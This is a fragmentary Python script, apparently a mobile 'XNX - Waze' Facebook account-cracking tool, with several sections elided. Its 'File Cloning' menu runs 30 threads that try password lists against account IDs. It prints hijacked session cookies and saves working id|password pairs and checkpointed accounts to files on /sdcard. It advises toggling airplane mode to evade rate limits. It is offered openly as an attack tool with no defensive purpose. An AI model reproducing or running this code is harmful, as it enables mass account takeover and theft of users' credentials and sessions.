...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/10087968037887377/ ')
try:
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36 OPR/60.0.2254.59405"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"}
...
\  \ /  / |  \ |  | \  \ /  /  • XNX - Waze 
 \  V  /  |   \|  |  \  V  /   • Version  : \033[;36m1.0\033[1;37m 
  >   <   |  . `  |   >   <    • Thnks Allot 
 /  .  \  |  |\   |  /  .  \  
/__/ \__\ |__| \__| /__/ \__\ 
\033[1;37m------------------------------------------------------""")           
  ...
  os.system(f'xdg-open https://www.facebook.com/gieQty')
  time.sleep(1)
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://www.facebook.com/gieQty'+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
___   ___ .__   __. ___   ___ 
\  \ /  / |  \ |  | \  \ /  /  • XNX - Waze 
 \  V  /  |   \|  |  \  V  /   • Version  : \033[;36m1.1\033[1;37m 
  >   <   |  . `  |   >   <    • Thnks Allot 
 /  .  \  |  |\   |  /  .  \  
/__/ \__\ |__| \__| /__/ \__\ 
\033[1;37m------------------------------------------------------""")
...
def menu():
			clear()
			print(' \033[1;32m[1]\033[1;37m File Cloning\n \033[1;32m[2]\033[1;37m Join whatsap group \n \033[1;32m[3]\033[1;37m Exit menu')
			linex()
			...
			if xd in ['1','01']:
				...
				linex()
				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids) \033[1;32m  (best) \n\033[1;33m [2]\033[1;37m Method  (for new ids)\033[1;32m   (best) ')
				linex()
				mthd=input(' [?] Choose : ')
				linex()
				plist = []
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;37mUse Airplane Mode After 1 Minutes.')
					linex()
					for user in fo:
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ XNX ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                print(f'\r\r\033[1;32m [XNX\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m-\033[1;37m\033[1;32m %s'%(ids,pas))
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/XNX-OK-M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [XNX-CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/xnx-cp.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/XNX-OK-M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
